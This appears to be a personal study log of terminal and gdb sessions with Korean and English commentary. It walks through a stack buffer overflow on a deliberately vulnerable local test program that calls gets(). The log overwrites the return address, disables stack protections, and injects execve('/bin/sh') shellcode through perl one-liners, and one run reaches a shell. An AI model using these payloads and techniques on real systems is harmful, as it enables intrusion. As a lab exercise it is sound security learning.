+f7e05000-f7fb2000 r-xp 00000000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb2000-f7fb3000 ---p 001ad000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb3000-f7fb5000 r--p 001ad000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb5000-f7fb6000 rw-p 001af000 103:07 3538950                           /lib32/libc-2.23.so
+f7fb6000-f7fb9000 rw-p 00000000 00:00 0 
+f7fd4000-f7fd5000 rw-p 00000000 00:00 0 
+f7fd5000-f7fd8000 r--p 00000000 00:00 0                                  [vvar]
+f7fd8000-f7fda000 r-xp 00000000 00:00 0                                  [vdso]
+f7fda000-f7ffc000 r-xp 00000000 103:07 3538948                           /lib32/ld-2.23.so
+f7ffc000-f7ffd000 r--p 00022000 103:07 3538948                           /lib32/ld-2.23.so
+f7ffd000-f7ffe000 rw-p 00023000 103:07 3538948                           /lib32/ld-2.23.so
+fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
+(gdb) 
+
+
+
+
+
+
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ readelf -h morris_worm_ex
+ELF Header:
+  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF32
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Intel 80386
+  Version:                           0x1
+  Entry point address:               0x8048310
+  Start of program headers:          52 (bytes into file)
+  Start of section headers:          6116 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               52 (bytes)
+  Size of program headers:           32 (bytes)
+  Number of program headers:         9
+  Size of section headers:           40 (bytes)
+  Number of section headers:         31
+  Section header string table index: 28
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ readelf -d morris_worm_ex
+
+Dynamic section at offset 0xf14 contains 24 entries:
+  Tag        Type                         Name/Value
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000c (INIT)                       0x80482a8
+ 0x0000000d (FINI)                       0x8048494
+ 0x00000019 (INIT_ARRAY)                 0x8049f08
+ 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
+ 0x0000001a (FINI_ARRAY)                 0x8049f0c
+ 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
+ 0x6ffffef5 (GNU_HASH)                   0x80481ac
+ 0x00000005 (STRTAB)                     0x804821c
+ 0x00000006 (SYMTAB)                     0x80481cc
+ 0x0000000a (STRSZ)                      74 (bytes)
+ 0x0000000b (SYMENT)                     16 (bytes)
+ 0x00000015 (DEBUG)                      0x0
+ 0x00000003 (PLTGOT)                     0x804a000
+ 0x00000002 (PLTRELSZ)                   16 (bytes)
+ 0x00000014 (PLTREL)                     REL
+ 0x00000017 (JMPREL)                     0x8048298
+ 0x00000011 (REL)                        0x8048290
+ 0x00000012 (RELSZ)                      8 (bytes)
+ 0x00000013 (RELENT)                     8 (bytes)
+ 0x6ffffffe (VERNEED)                    0x8048270
+ 0x6fffffff (VERNEEDNUM)                 1
+ 0x6ffffff0 (VERSYM)                     0x8048266
+ 0x00000000 (NULL)                       0x0
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ readelf -l morris_worm_ex
+
+Elf file type is EXEC (Executable file)
+Entry point 0x8048310
+There are 9 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
+  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x0059c 0x0059c R E 0x1000
+  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000
+  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
+  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x0004b0 0x080484b0 0x080484b0 0x0002c 0x0002c R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
+  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     
+   01     .interp 
+   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
+   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
+   04     .dynamic 
+   05     .note.ABI-tag .note.gnu.build-id 
+   06     .eh_frame_hdr 
+   07     
+   08     .init_array .fini_array .jcr .dynamic .got 
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ readelf -S morris_worm_ex
+There are 31 section headers, starting at offset 0x17e4:
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
+  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
+  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
+  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4
+  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1
+  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2
+  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4
+  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4
+  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4
+  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4
+  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16
+  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8
+  [14] .text             PROGBITS        08048310 000310 000182 00  AX  0   0 16
+  [15] .fini             PROGBITS        08048494 000494 000014 00  AX  0   0  4
+  [16] .rodata           PROGBITS        080484a8 0004a8 000008 00   A  0   0  4
+  [17] .eh_frame_hdr     PROGBITS        080484b0 0004b0 00002c 00   A  0   0  4
+  [18] .eh_frame         PROGBITS        080484dc 0004dc 0000c0 00   A  0   0  4
+  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
+  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
+  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
+  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
+  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
+  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4
+  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4
+  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1
+  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1
+  [28] .shstrtab         STRTAB          00000000 0016da 00010a 00      0   0  1
+  [29] .symtab           SYMTAB          00000000 001054 000450 10     30  47  4
+  [30] .strtab           STRTAB          00000000 0014a4 000236 00      0   0  1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings)
+  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ 
+
+
+
+
+===>
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ gdb -q ./morris_worm_ex
+Reading symbols from ./morris_worm_ex...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048414
+(gdb) r < input.txt
+Starting program: /home/guybrush/Project/github/hack/binhacks/buffer_overflow/morris_worm_ex < input.txt
+
+Breakpoint 1, 0x08048414 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+=> 0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x0804841a in main ()
+(gdb) 
+0x0804841b in main ()
+(gdb) 
+0x08048420 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+=> 0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd4	0xffffcbd4
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048420	0x8048420 <main+21>
+eflags         0x246	[ PF ZF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) si
+0x08048423 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+=> 0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048423	0x8048423 <main+24>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $esp
+0xffffcbd8:	0x41414141
+(gdb) x/x $esp+4
+0xffffcbdc:	0x41414141
+(gdb) x/x $esp-4
+0xffffcbd4:	0xffffcbd8
+
+
+(gdb) x/138x $esp-4
+0xffffcbd4:	0xffffcbd8	0x41414141	0x41414141	0x41414141
+0xffffcbe4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcbf4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc04:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc14:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc24:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc34:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc44:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc54:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc64:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc74:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc84:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc94:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcca4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccb4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccc4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccd4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcce4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccf4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd04:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd14:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd24:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd34:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd44:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd54:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd64:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd74:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd84:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd94:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcda4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdb4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdc4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdd4:	0x41414141	0x41414141	0x42424242	0x00000000
+0xffffcde4:	0xffffce74	0xffffce7c	0x00000000	0x00000000
+0xffffcdf4:	0x00000000	0xf7fb5000
+(gdb) x/x 0xfffcddc
+0xfffcddc:	Cannot access memory at address 0xfffcddc
+(gdb) x/x 0xffffcddc
+0xffffcddc:	0x42424242
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+=> 0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x08048428 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+=> 0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x08048429 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+=> 0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0x0	0
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcddc	0xffffcddc
+ebp            0x41414141	0x41414141
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048429	0x8048429 <main+30>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) si
+0x42424242 in ?? ()
+(gdb) disassemble 
+No function contains program counter for selected frame.
+(gdb) i r
+eax            0x0	0
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcde0	0xffffcde0
+ebp            0x41414141	0x41414141
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x42424242	0x42424242
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb)
+
+
+buffer overflow 취약점 통해 main 함수 이전으로 돌아가기 위한 return address가 0x42424242로 변경되었고,
+
+ret(pop eip) 명령 수행되는 순간, eip가 return address인 0x42424242를 가리키게 되면서, program의 종료 후 원하는 주소로 jump가 가능하게 되었다.
+
+
+It is possible to control program because return address is hijacked.
+
+
+So Far ...
+
+We hijacked the control of the program. (= We can jump to anywhere!)
+
+But, where do we jump to?
+
+We want to inject some code to run!
+
+
+
+만약, return address를 0x42424242가 아닌 line buffer의 주소인 "0xffffcbd8"로 조작하고,
+
+gets의 input 값에 공격 코드는 삽입한다면? 또는 shell code를 삽입할 수 있다면?
+
+
+Make the return address of main to stack address of line buffer, the put some arbitrary code to there!!!
+
+=> This is so-called the return-to-stack exploit.
+
+
+===>
+
+Try 해보자
+
+stack에서의 실행을 위해 옵션을 수정하여 재빌드한다.
+
+gcc -o morris_worm_ex morris_worm_ex.c -m32 -mpreferred-stack-boundary=2 -O0 -fno-stack-protector -Wl,-z,execstack
+
+23 bytes의 shell code를 line buffer의 주소인 0xffffcbd8에 입력시키고, return address를 0xffffcd8로 조작해 보자.
+
+
+
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ perl -e 'print "\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "A"x495 . "\xd8\xcb\xff\xff"' | ./morris_worm_ex 
+Segmentation fault (core dumped)
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ perl -e 'print "\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "A"x495 . "\xd8\xcb\xff\xff"' > input2.txtguybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ gdb -q ./morris_worm_ex
+Reading symbols from ./morris_worm_ex...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048414
+(gdb) r < input2.txt 
+Starting program: /home/guybrush/Project/github/hack/binhacks/buffer_overflow/morris_worm_ex < input2.txt
+
+Breakpoint 1, 0x08048414 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+=> 0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x0804841a in main ()
+(gdb) 
+0x0804841b in main ()
+(gdb) 
+0x08048420 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+=> 0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x08048423 in main ()
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048423	0x8048423 <main+24>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/138x $esp
+0xffffcbd8:	0xe1f7c931	0x2f2f6850	0x2f686873	0x896e6962
+0xffffcbe8:	0xcd0bb0e3	0x41414180	0x41414141	0x41414141
+0xffffcbf8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc08:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc18:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc28:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc38:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc48:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc58:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc68:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc78:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc88:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcc98:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcca8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccb8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccc8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccd8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd48:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd58:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd68:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd78:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd88:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd98:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcda8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdb8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdc8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcdd8:	0x41414141	0xffffcbd8	0x00000000	0xffffce74
+0xffffcde8:	0xffffce7c	0x00000000	0x00000000	0x00000000
+0xffffcdf8:	0xf7fb5000	0xf7ffdc04
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+=> 0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) ni
+0x08048428 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+=> 0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0x0	0
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048428	0x8048428 <main+29>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) ni
+0x08048429 in main ()
+(gdb) i r
+eax            0x0	0
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcddc	0xffffcddc
+ebp            0x41414141	0x41414141
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048429	0x8048429 <main+30>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x 0xffffcddc
+0xffffcddc:	0xffffcbd8
+(gdb) si
+0xffffcbd8 in ?? ()
+(gdb) disassemble 
+No function contains program counter for selected frame.
+(gdb) i r
+eax            0x0	0
+ecx            0xf7fb55a0	-134523488
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcde0	0xffffcde0
+ebp            0x41414141	0x41414141
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0xffffcbd8	0xffffcbd8
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/8i 0xffffcbd8
+=> 0xffffcbd8:	xor    ecx,ecx
+   0xffffcbda:	mul    ecx
+   0xffffcbdc:	push   eax
+   0xffffcbdd:	push   0x68732f2f
+   0xffffcbe2:	push   0x6e69622f
+   0xffffcbe7:	mov    ebx,esp
+   0xffffcbe9:	mov    al,0xb
+   0xffffcbeb:	int    0x80
+(gdb) si
+0xffffcbda in ?? ()
+(gdb) 
+0xffffcbdc in ?? ()
+(gdb) 
+0xffffcbdd in ?? ()
+(gdb) 
+0xffffcbe2 in ?? ()
+(gdb) 
+0xffffcbe7 in ?? ()
+(gdb) 
+0xffffcbe9 in ?? ()
+(gdb) 
+0xffffcbeb in ?? ()
+(gdb) 
+process 2016 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: Function "main" not defined.
+[Inferior 1 (process 2016) exited normally]
+(gdb) 
+
+
+
+
+
+
+
+
+
+위의 시도의 경우 ret가 수행되면서 eip 레지스터에 조작된 주소인 0xffffcbd8이 저장되어 의도된 주소로 jump가 가능했지만,
+
+leave(mov esp, ebp; pop ebp;), ret(pop eip)가 수행되면서 stack pointer가 이전 함수의 return address가 저장된 위치로 초기화되고,
+
+현재 main 함수의 stack frame은 destroy 된다.
+
+따라서, 원하는 주소에 shell code를 올려두었지만, destroy된 stack frame 영역이어서 정상적으로 code가 수행되지 않는 것으로 예상이 된다.
+
+그럼...main함수를 호출한, 즉, main 함수 이전의 stack 영역에 shell code를 올려두고, 그 위치로 jump를 해보면 어떨까?
+
+
+
+우선, main 함수의 stack 영역을(line buffer 512 bytes) 모두 A로 채우고, 이전 함수의 ebp(4 bytes)까지 총 516 bytes를 A로 덮어쓴다.
+
+그리고 return address를 덮어써야 하는 stack 주소인 0xffffcddc 에는 4 bytes 다음 주소인 0xffffcde0를 덮어써주고, 바로 shell code를 입력한다. 
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ perl -e 'print "A"x516 . "\xe0\xcd\xff\xff" . "\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"' | ./morris_worm_ex 
+ls -al
+cat
+^C
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$
+
+shell이 실행이 된 것 같은데....명령어가 안먹네... stdin / stdout 설정이 필요한 듯....
+
+
+
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+=> 0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb)
+
+
+
+perl -e 'print "A"x516 . "\xe0\xcd\xff\xff" . "\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"' > input5.txt
+
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ gdb -q ./morris_worm_ex
+Reading symbols from ./morris_worm_ex...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048414
+(gdb) r < input5.txt 
+Starting program: /home/guybrush/Project/github/hack/binhacks/buffer_overflow/morris_worm_ex < input5.txt
+
+Breakpoint 1, 0x08048414 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+=> 0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
